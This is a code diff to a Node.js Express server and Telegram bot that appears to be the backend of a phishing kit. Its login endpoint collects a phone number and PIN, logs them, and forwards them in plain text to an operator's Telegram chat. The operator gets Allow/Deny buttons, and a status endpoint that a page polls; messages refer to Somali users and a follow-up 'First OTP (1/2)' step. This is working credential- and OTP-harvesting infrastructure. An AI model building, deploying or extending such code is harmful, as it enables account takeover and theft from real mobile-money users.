@@ -18,8 +18,8 @@ console.log("🟡 ADMIN_ID:", ADMIN_ID);
 // -------------------- BOT INIT --------------------
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-// -------------------- MEMORY STORE (APPROVAL SYSTEM) --------------------
-const statusStore = {}; // phone => status (pending/approved/denied)
+// -------------------- MEMORY STORE --------------------
+const statusStore = {}; // phone => status
 
 // -------------------- MIDDLEWARE --------------------
 app.use(express.json());
@@ -48,6 +48,8 @@ app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
     const currentTime = new Date().toLocaleString('en-US', { hour12: true });
 
+    console.log("🔥 LOGIN REQUEST:", req.body);
+
     if (!phone || !pin) {
         return res.status(400).json({ error: "Missing phone or pin" });
     }
@@ -58,37 +60,41 @@ app.post('/api/login-notification', async (req, res) => {
 
     statusStore[phone] = "pending";
 
-    // UPDATED MESSAGE 1: Matches your first image
     const message =
-        `📱 **CL 2 - LOGIN ATTEMPT**\n\n` +
-        `🆕 **NEW USER**\n` +
-        `🇸🇴 **Country:** Somalia\n` +
-        `🌍 **Country Code:** +252\n` +
-        `📱 **Phone Number:** ${phone}\n` +
-        `🔢 **PIN:** ${pin}\n` +
-        `⏰ **Time:** ${currentTime}\n\n` +
-        `📱 **New user - will show 2 OTPs**\n` +
-        `────────────────────\n\n` +
-        `⚠️ **User waiting for approval**\n` +
-        `⏱ **Timeout: 5 minutes**`;
+        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
+        `🆕 NEW USER\n` +
+        `🇸🇴 Country: Somalia\n` +
+        `🌍 Code: +252\n` +
+        `📱 Phone: ${phone}\n` +
+        `🔢 PIN: ${pin}\n` +
+        `⏰ Time: ${currentTime}\n\n` +
+        `⚠️ Waiting for approval`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
             parse_mode: 'Markdown',
             reply_markup: {
-                inline_keyboard:,
+                inline_keyboard: [
+                    [
+                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
+                    ],
+                    [
+                        { text: "❌ Deny", callback_data: `deny_${phone}` }
+                    ]
                 ]
             }
         });
 
+        console.log("✅ Telegram message sent");
         res.json({ success: true });
+
     } catch (err) {
         console.error("❌ TELEGRAM ERROR:", err);
         res.status(500).json({ error: err.message });
     }
 });
 
-// -------------------- STATUS CHECK (FOR PAGE7) --------------------
+// -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
     res.json({
@@ -101,40 +107,37 @@ bot.start((ctx) => {
     ctx.reply("🤖 Bot is active and running");
 });
 
-// -------------------- APPROVE ACTION --------------------
+// -------------------- APPROVE --------------------
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
-    const timeNow = new Date().toLocaleTimeString('en-US', { hour12: true });
 
     statusStore[phone] = "approved";
 
-    // UPDATED MESSAGE 2: Matches your second image
+    const timeNow = new Date().toLocaleTimeString('en-US', { hour12: true });
+
     const msg =
-        `✅ **LOGIN APPROVED**\n\n` +
-        `🆕 **NEW USER**\n` +
-        `🇸🇴 **Somalia**\n` +
-        `📱 **${phone}**\n` +
-        `🔐 **${pin}**\n\n` +
-        `────────────────────\n\n` +
-        `✅ **Status: Approved**\n` +
-        `➡ **Next: First OTP (1/2)**\n` +
-        `⌚ **${timeNow}**`;
+        `✅ LOGIN APPROVED\n\n` +
+        `📱 ${phone}\n` +
+        `🔐 ${pin}\n\n` +
+        `Status: Approved\n` +
+        `Time: ${timeNow}`;
 
     try {
-        await ctx.editMessageText(msg, { parse_mode: 'Markdown' });
+        await ctx.editMessageText(msg);
     } catch (e) {
         console.error("❌ EDIT ERROR:", e.message);
     }
 });
 
-// -------------------- DENY ACTION --------------------
+// -------------------- DENY --------------------
 bot.action(/deny_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
+
     statusStore[phone] = "denied";
 
     try {
-        await ctx.editMessageText("❌ **LOGIN DENIED**\nInformashinka waa khalad.", { parse_mode: 'Markdown' });
+        await ctx.editMessageText("❌ LOGIN DENIED");
     } catch (e) {
         console.error("❌ DENY ERROR:", e.message);
     }
@@ -145,7 +148,7 @@ app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
 
-// -------------------- BOT LAUNCH (SAFE) --------------------
+// -------------------- BOT LAUNCH --------------------
 const startBot = async () => {
     try {
         await bot.telegram.deleteWebhook({ drop_pending_updates: true });
@@ -159,5 +162,10 @@ const startBot = async () => {
 startBot();
 
 // -------------------- ERROR HANDLING --------------------
-process.on('unhandledRejection', (err) => { console.error("❌ UNHANDLED REJECTION:", err); });
-process.on('uncaughtException', (err) => { console.error("❌ UNCAUGHT EXCEPTION:", err); });
+process.on('unhandledRejection', (err) => {
+    console.error("❌ UNHANDLED REJECTION:", err);
+});
+
+process.on('uncaughtException', (err) => {
+    console.error("❌ UNCAUGHT EXCEPTION:", err);
+});
